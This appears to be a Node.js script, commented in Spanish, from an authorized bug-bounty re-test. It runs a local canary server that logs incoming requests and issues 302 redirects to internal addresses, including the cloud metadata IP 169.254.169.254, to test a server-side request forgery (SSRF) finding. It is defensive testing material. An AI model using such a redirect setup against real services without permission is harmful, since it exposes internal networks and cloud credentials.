'use strict';
// ============================================================================
// canario-ssrf.js — Servidor canario propio para el re-test SSRF (302)
// Protocolo §3 de docs/bugbounty/RETEST-SSRF-302-PROTOCOLO-2026-09-06.md
//
//   node backend/canario-ssrf.js          # escucha en 127.0.0.1:8210
//
// Rutas:
//   GET /step1?v=<nonce>&next=<host>  → 302 Location: http://<next>/step2?canary=<nonce>
//                                       (solo APUNTA a hosts internos del protocolo;
//                                        NUNCA los fetchamos nosotros)
//   GET /hit                          → registro de golpe directo (control)
//   /*                                → log de cualquier otra petición
//
// Log de cada petición: timestamp, IP de origen, User-Agent, path, query →
//   evidencia-poc/http/canario-ssrf-log.json (JSON Lines) y .txt legible
// ============================================================================
const http = require('http');
const fs = require('fs');
const path = require('path');

const PUERTO = 8210;
const EVID = path.join(__dirname, '..', 'evidencia-poc', 'http');
const LOG_JSON = path.join(EVID, 'canario-ssrf-log.json');
const LOG_TXT = path.join(EVID, 'canario-ssrf-log.txt');

// Hosts internos autorizados por el protocolo como LOCATION del 302 (daño mínimo)
const HOSTS_PERMITIDOS = ['169.254.169.254', '10.0.0.1', '100.64.0.1', '10.255.255.1'];

function loguear(entrada) {
  const linea = `${entrada.ts} | ${entrada.ip} | ${entrada.metodo} ${entrada.urlCompleta} | UA="${entrada.ua}"${entrada.extra ? ' | ' + entrada.extra : ''}`;
  fs.appendFileSync(LOG_TXT, linea + '\n');
  fs.appendFileSync(LOG_JSON, JSON.stringify(entrada) + '\n');
  console.log('[canario]', linea);
}

http.createServer((req, res) => {
  const u = new URL(req.url, `http://127.0.0.1:${PUERTO}`);
  const base = {
    ts: new Date().toISOString(),
    ip: req.socket.remoteAddress,
    metodo: req.method,
    urlCompleta: req.url,
    ua: req.headers['user-agent'] || '',
    path: u.pathname,
    query: Object.fromEntries(u.searchParams.entries()),
  };

  if (u.pathname === '/step1') {
    const nonce = u.searchParams.get('v') || 'sin-nonce';
    const next = u.searchParams.get('next') || '169.254.169.254';
    if (!HOSTS_PERMITIDOS.includes(next)) {
      res.writeHead(400); res.end('next no autorizado');
      loguear({ ...base, extra: 'RECHAZADO next=' + next });
      return;
    }
    loguear({ ...base, extra: `302 → http://${next}/step2?canary=${nonce}` });
    res.writeHead(302, { Location: `http://${next}/step2?canary=${encodeURIComponent(nonce)}` });
    res.end();
    return;
  }

  if (u.pathname === '/hit') {
    loguear({ ...base, extra: 'GOLPE DIRECTO (control)' });
    res.writeHead(204); res.end();
    return;
  }

  loguear(base);
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('canario knk-suite\n');
}).listen(PUERTO, '127.0.0.1', () => {
  console.log(`[canario] escuchando en http://127.0.0.1:${PUERTO}`);
  console.log(`[canario] logs: ${LOG_JSON} / ${LOG_TXT}`);
});
